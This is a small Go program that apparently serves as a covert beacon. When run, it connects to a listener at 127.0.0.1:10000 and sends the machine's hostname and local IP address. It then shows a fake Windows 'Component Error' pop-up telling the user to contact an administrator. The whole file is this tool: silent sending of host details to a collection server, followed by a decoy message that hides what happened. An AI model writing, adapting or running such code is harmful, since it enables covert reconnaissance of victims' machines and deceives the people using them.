package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
)

func main() {
	connectToServer()
	displayErrorMessage()
}

func connectToServer() {
	conn, err := net.Dial("tcp", "127.0.0.1:10000")
	if err != nil {
		fmt.Println("Error connecting:", err.Error())
		return
	}
	defer conn.Close()

	hostName, _ := os.Hostname()
	ipAddress, _ := getLocalIP()

	// 使用制表符 \t 作为分隔符而不是逗号和冒号
	conn.Write([]byte(fmt.Sprintf("%s\t%s\n", hostName, ipAddress)))
}

func getLocalIP() (string, error) {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "", err
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)

	return localAddr.IP.String(), nil
}

func displayErrorMessage() {
	// Display error message
	cmd := exec.Command("cmd", "/c", "msg", "*", "Component Error: A required component is missing. Please contact your system administrator.")
	err := cmd.Run()
	if err != nil {
		fmt.Println("Error displaying message:", err)
	}
}
